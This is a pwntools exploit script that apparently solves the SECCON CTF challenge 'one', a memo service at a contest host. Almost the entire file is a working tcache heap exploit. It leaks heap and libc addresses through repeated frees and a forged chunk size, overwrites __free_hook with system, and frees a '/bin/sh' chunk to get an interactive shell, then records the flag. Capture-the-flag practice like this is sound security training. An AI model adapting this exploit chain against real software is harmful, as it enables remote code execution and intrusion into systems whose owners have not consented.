from pwn import *

binpath = './one'
binary = ELF(binpath)
libc = binary.libc

context.binary = binary
context.terminal = ['tmux', 'split-w', '-h']

gdbscript = '''
gef
# b *(0x0000555555554000+0x09ad)
b *(0x0000555555554000+0x09c7)
ignore 1 13
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)
io = remote('one.chal.seccon.jp', 18357)


def debug(func):
    def wrapper(*args, **kwargs):
        print('{}({}, {})'.format(str(func.__name__), str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def add(data):
    io.sendafter(b'> ', b'1\n')
    io.sendafter(b'Input memo >', data)
    io.recvuntil('Done.')

@debug
def show():
    io.sendafter(b'> ', b'2\n')
    data = io.recvuntil(b'Done.')[:-5].rstrip()
    return data

@debug
def delete():
    io.sendafter(b'> ', b'3\n')
    io.recvuntil('Done.')


for i in range(14):
    add(str(i) + '\n')

add('A' * 8 + '\n')

delete()
delete()
delete()

data = show()
addr_heap = u64(data.ljust(8, '\x00')) - 0x16d0

print("addr_heap = 0x{:x}".format(addr_heap))

print("overwrite size of first chunk")
addr_size = addr_heap + 0x12b8
addr_chunk = addr_size + 8

print("addr_size = 0x{:x}".format(addr_size))
print("addr_chunk = 0x{:x}".format(addr_size + 8))

add(p64(addr_size - 8) + '\n')
add('consume\n')
add('\x00' * 8 + p64(0x4b1) + '\x00' * 8 + '\n')  # overwrite size here

add('B' * 0x30 + p32(0x4b0) + '\n')
add('C' * 8 + '\n')
delete()
delete()
delete()

add(p64(addr_chunk) + '\n')
add('consume2\n')
add('D' * 8 + '\n')
delete()

data = show()
addr_libc = u64(data.ljust(8, '\x00')) - 0x3ebca0
print('addr_libc = 0x{:x}'.format(addr_libc))

add('E' * 8 + '\n')
delete()
delete()
delete()
add(p64(addr_libc + libc.symbols['__free_hook']) + '\n')
add('consume3\n')
add(p64(addr_libc + libc.symbols['system']) + '\n')

add('/bin/sh\x00\n')

io.sendafter(b'> ', b'3\n')

io.interactive()

# SECCON{4r3_y0u_u53d_70_7c4ch3?}
